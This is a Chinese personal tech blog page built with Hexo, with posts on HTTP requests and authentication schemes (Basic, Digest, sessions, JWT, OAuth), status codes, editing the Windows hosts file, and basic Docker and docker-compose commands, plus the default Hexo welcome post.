<h1 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h1><h2 id="请求头-请求方法"><a href="#请求头-请求方法" class="headerlink" title="请求头-请求方法"></a>请求头-请求方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:请求指定的页面信息</span><br><span class="line">post:向指定资源提交数据</span><br><span class="line">trace:回显服务器收到的请求，主要用于测试或诊断</span><br><span class="line">head:与get请求相似，但是只返回响应行和响应头，不返回响应正文</span><br><span class="line">delete:请求删除服务器指定的界面</span><br><span class="line">options:允许客户端查看服务器的性能</span><br><span class="line">put:从客户端向服务器传送数据并进行存储或替换</span><br></pre></td></tr></table></figure>

<h2 id="请求头-HTTP认证"><a href="#请求头-HTTP认证" class="headerlink" title="请求头-HTTP认证"></a>请求头-HTTP认证</h2><h3 id="Basic-Auth"><a href="#Basic-Auth" class="headerlink" title="Basic Auth"></a>Basic Auth</h3><p>简单的使用base64对密码、用户名进行加密，并将加密后的信息放在Header中，本质上还是明文传输用户名、密码等，基本流程：</p>
<ul>
<li>客户端发起GET请求</li>
<li>服务器响应401 Unauthorized，www-Authenticate指定认证算法，realm指定安全域</li>
<li>客户端重新发起请求，Authorization指定用户名和密码信息</li>
<li>服务器认证成功，响应200</li>
</ul>
<h3 id="Digest-Auth"><a href="#Digest-Auth" class="headerlink" title="Digest Auth"></a>Digest Auth</h3><p>摘要认证使用随机数+MD5加密哈希函数来对用户名、密码进行加密，在上述第二步时服务器返回随机字符串nonnce，之后客户端发送摘要=MD5（HA1:nonce:HA2），其中HA1=MD5(username:realm:password),HA2=MD5(method:digestURI)</p>
<h3 id="SSL-Clisent"><a href="#SSL-Clisent" class="headerlink" title="SSL Clisent"></a>SSL Clisent</h3><p>SSL认证安全级别较高，但需要承担证书费用。基本流程：</p>
<ul>
<li>客户端请求服务资源，服务器要求客户端出示数字证书。</li>
<li>客户端发送数字证书</li>
<li>服务器验证通过后取出证书的公钥。</li>
<li>服务端随机生成一个随机数即为对称密钥，并使用非对称算法和证书公钥加密。</li>
<li>客服端使用非对称解密算法和证书私钥获取服务端发送的对称密钥。由于只有客户端和服务端有对称密钥，所以后续发送的请求较安全。</li>
</ul>
<h3 id="FormBase（表单认证）"><a href="#FormBase（表单认证）" class="headerlink" title="FormBase（表单认证）"></a>FormBase（表单认证）</h3><p>由于HTTP协议是无状态的，而服务器端的业务必须是要有状态的。Cookie诞生的最初目的是为了存储web中的状态信息，以方便服务器端使用。</p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>是客户端保存用户信息的一种机制，存储在<strong>客户端</strong>的文件中。</p>
<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><blockquote>
<p>扩展性不好，存在跨域 和 集群session同步的问题。<br>面对csrf（Cross-site request forgery）攻击，中文名称：跨站请求伪造，不如jwt。</p>
</blockquote>
<p>Session是在无状态的HTTP下服务端跟踪用户状态时用于标识具体用户的机制，Session信息存储在<strong>服务器</strong>端的数据库或文件中。</p>
<p>工作机制:为每个访问者创建一个唯一的ID，并基于这个ID来存储变量。</p>
<h4 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h4><p>验证流程： </p>
<p>1.把用户的用户名和密码发到后端 </p>
<p>2.后端进行校验，校验成功会生成token, 把token发送给客户端 </p>
<p>3.<strong>客户端</strong>自己保存token, 再次请求就要在Http协议的请求头中带着token去访问服务端，和在服务端保存的token信息进行比对校验。</p>
<h4 id="JWT（json-web-token）"><a href="#JWT（json-web-token）" class="headerlink" title="JWT（json web token）"></a>JWT（json web token）</h4><blockquote>
<p>没有跨域问题、集群下登录信息同步的问题。<br>一旦签发，到期前无法简单废止，最好用https。<br>server无状态，性能高。</p>
</blockquote>
<p>验证流程： </p>
<p>1、用户向服务器发送用户名和密码。<br>2、服务器验证通过后，生成jwt，可以有选择的在其中 保存用户信息及数据。也可以加密。<br>3、服务器向用户返回jwt，存储在<strong>客户端</strong>。<br>4、用户随后的每一次请求，都会在 cookie 或者<br>header或参数里，将 jwt 传回服务器鉴权。<br>5、服务器收到jwt，找到前期保存的数据，由此得知用户的身份。</p>
<h4 id="OAuth2-0-用于第三方认证"><a href="#OAuth2-0-用于第三方认证" class="headerlink" title="OAuth2.0 用于第三方认证"></a>OAuth2.0 用于第三方认证</h4><p>目的在于让客户端安全可控地获取”用户”的授权</p>
<p>比如说，登录微博（客户端）的时候，懒得新建账号了就用qq账号登录，选择qq登录。这时就是oauth登场的场景。</p>
<p>客户端不必保存登录用户（qq）的登录密码。 更精细的控制权限，即权限的到期时间，提升安全性。</p>
<h2 id="请求头-关键字段"><a href="#请求头-关键字段" class="headerlink" title="请求头-关键字段"></a>请求头-关键字段</h2><p>Content-Type、X-Forward-For、Host、Referer、Accept-Language、Conten-Length、User-Agent、Accept-Encoding</p>
<h2 id="请求体"><a href="#请求体" class="headerlink" title="请求体"></a>请求体</h2><ol>
<li><p>参数拼接</p>
</li>
<li><p>JSON</p>
</li>
<li><p>XML</p>
</li>
</ol>
<h1 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h1><h2 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h2><ul>
<li>1××：服务器收到请求，需要请求者继续执行操作</li>
<li>2××：操作被成功接受并处理</li>
<li>3××：重定向，需要进一步操作以完成请求</li>
<li>4××：客户端错误，请求包含语法错误或无法完成请求</li>
<li>5××：服务器错误，服务器在处理请求过程中发生了错误</li>
</ul>
<h2 id="HTTP-响应头"><a href="#HTTP-响应头" class="headerlink" title="HTTP 响应头"></a>HTTP 响应头</h2><ol>
<li>Location：控制浏览器重定向到哪个页面</li>
<li>Server：服务器的banner信息</li>
<li>Set-Cookie：服务器发送给客户端的Cookie设置信息</li>
<li>Cache-Control：服务器控制浏览器是否要缓存页面</li>
</ol>
<h1 id="修改hosts文件"><a href="#修改hosts文件" class="headerlink" title="修改hosts文件"></a>修改hosts文件</h1><ol>
<li><p>win10 x64系统，hosts文件位置：C:\Windows\System32\drivers\etc</p>
</li>
<li><p>在末尾添加一行（回车多空出一行）</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/2021-03-16_095652.png" alt="2021-03-16_095652"></p>
</li>
<li><p>发现修改后，重启浏览器还是可以正常访问</p>
</li>
<li><p>通过ipconfig /flushdns命令清除DNS缓存</p>
</li>
<li><p>再次访问<a target="_blank" rel="noopener" href="http://www.abc.com发现直接访问本地/">www.abc.com发现直接访问本地</a></p>
</li>
</ol>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/2021-03-16_101002.png" alt="2021-03-16_101002"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/25/docker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/docker/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 17:01:30" itemprop="dateCreated datePublished" datetime="2021-05-25T17:01:30+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-17 00:21:58" itemprop="dateModified" datetime="2021-04-17T00:21:58+08:00">2021-04-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Docker是一个开源的容器引擎，它有助于更快地交付应用。方便快捷已经是 Docker的最大优势，过去需要用数天乃至数周的任务，在Docker容器的处理下，只需要数秒就能完成。</p>
<p>先启动docker  在启动docker-compose</p>
<p><strong>灯塔账号：admin  密码：arlpass</strong></p>
<h1 id="docker基本"><a href="#docker基本" class="headerlink" title="docker基本"></a>docker基本</h1><ul>
<li><p>启动docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure></li>
<li><p>重启docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart  docker</span><br></pre></td></tr></table></figure></li>
<li><p>关闭docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure></li>
<li><p>查看docker版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker verison</span><br></pre></td></tr></table></figure></li>
<li><p>显示docker系统的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure></li>
<li><p>查看后台正在运行程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="docker-compose常用命令"><a href="#docker-compose常用命令" class="headerlink" title="docker-compose常用命令"></a>docker-compose常用命令</h1><ul>
<li><p>在后台启动容器并使它们保持运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
<li><p>删除所有镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>删除docker中的镜像</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>

<ul>
<li>删除docker中的容器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker stop 镜像id</span><br><span class="line">docker rm 镜像id</span><br></pre></td></tr></table></figure>

<ul>
<li>对于已退出的容器，可以使用如下命令进行查看：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>阿里云ECS服务器基于Docker+WordPress搭建个人博客网站</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43767015/article/details/113860969">https://blog.csdn.net/weixin_43767015/article/details/113860969</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/24/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/111.jpg">
      <meta itemprop="name" content="t2ee">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="t2ee的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/24/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-24 15:21:21" itemprop="dateCreated datePublished" datetime="2021-05-24T15:21:21+08:00">2021-05-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="t2ee"
      src="/images/111.jpg">
  <p class="site-author-name" itemprop="name">t2ee</p>
  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2021-05 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">t2ee</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
